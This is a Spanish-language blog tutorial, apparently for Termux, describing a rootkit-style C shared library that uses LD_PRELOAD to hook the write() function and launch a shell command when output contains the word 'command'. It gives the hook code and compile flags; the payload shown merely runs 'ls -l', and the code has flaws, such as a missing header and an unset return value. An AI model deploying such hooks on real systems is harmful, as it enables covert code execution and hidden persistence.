# Mini tutorial de idea para crear un _rootkit_ para termux  

La idea principal es crear una biblioteca compartida en __C__ para suplantar la funcion  __write__ del
sistema. Utilizando  `LD_PRELOAD` que contiene una lista de objetos compartidos `ELF` especificados por el usuario.

Permite a los usuarios cargar estos objetos compartidos en el espacio de direcciones de un proceso antes que cualquier otra biblioteca compartida y antes de la ejecución del programa en sí.

### Sinopsis

```bash
export LD_PRELOAD=/path/to/candy.so:$LD_PRELOAD
```

###  Sinopsis de write

```cpp
#include <unistd.h>

ssize_t write(int fd, const void *buf, size_t count); 
```

# Descripcion

Escribe hasta __count__ bytes desde el `buffet` almacenando `buf` en el archivo al que hace referencia 
el descriptor de archivo `fd`. 

También utilizaremos la función `dlsym()` para realizar una búsqueda de símbolo. El cual sería la función __write__ en la biblioteca compartida especificada por `RTLD_NEXT` el cual indica que se debe buscar en la siguiente biblioteca compartida la lista de carga.

### Puntero a Función

Todas las funciones de _C_ están en punteros de actualidad a un punto en la memoria del programa donde existe algún código. El uso principal de un puntero de función es proporcionar una "devolución de llamada" a otras funciones (o para simular clases y objetos).

La sintaxis de una función es:

```
returnType (* nombre) (parámetros)
```

# Codigo

```cpp  
// Autor  : @demon_rip
// Nombre : candy

#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>

ssize_t write(int fildes, const void *buf, size_t nbytes) {
  // Puntera a  la  funcion   _write_
  ssize_t (*new_write)(int fildes, const void *buf, size_t nbytes);
  ssize_t result;
  //  Optenemos la direcion de  la  funcion  _write_ origina 
  new_write = (ssize_t(*)(int, const void *, size_t))dlsym(RTLD_NEXT, "write");

  // Buscar la palabra "command" en el buffer
  if (strstr((const char*)buf, "command") != NULL) { 
    // result = nbytes;
    char *args[] = {"/bin/bash", "-c", "ls -l", NULL};
    execvp(args[0],args);
  } else {
    result = new_write(fildes, buf, nbytes);
  }
  return result;
}
```

> Nota:  No se puede buscar en la condicion un comando . 

Este programa reacionara al intentar ejecutar un comando que no exista . Cualquir.


### Compilación 

```sh
gcc -ldl candy.c -fPIC -shared -D_GNU_SOURCE -o candy.so 
```

`-ldl` : Esto enlaza la biblioteca dinámica (`libdl`). La biblioteca `libdl` proporciona funciones para cargar dinámicamente bibliotecas compartidas en tiempo de ejecución.

`-fPIC`: Esta opción genera código independiente de la posición (Position Independent Code). Es necesario para crear bibliotecas compartidas para que el código generado pueda ser utilizado en cualquier dirección de memoria.

`-shared`: Esta opción indica que se debe crear una biblioteca compartida en lugar de un ejecutable. Las bibliotecas compartidas son archivos que pueden ser cargados en tiempo de ejecución por otros programas.

`-D_GNU_SOURCE`: Define la macro _GNU_SOURCE_. Esta macro habilita características y extensiones específicas de GNU en las bibliotecas estándar de C. Es útil para utilizar funciones y características adicionales que no están disponibles en el estándar ANSI C.


# Créditos 

A `@ivam3` por el cual obtuve una face beta de este código.



{% if page.comments %}
<div id="disqus_thread"></div>
<script>
    (function() { // DON'T EDIT BELOW THIS LINE
    var d = document, s = d.createElement('script');
    s.src = 'https://blok-termux.disqus.com/embed.js';
    s.setAttribute('data-timestamp', +new Date());
    (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
{% endif %} 



 
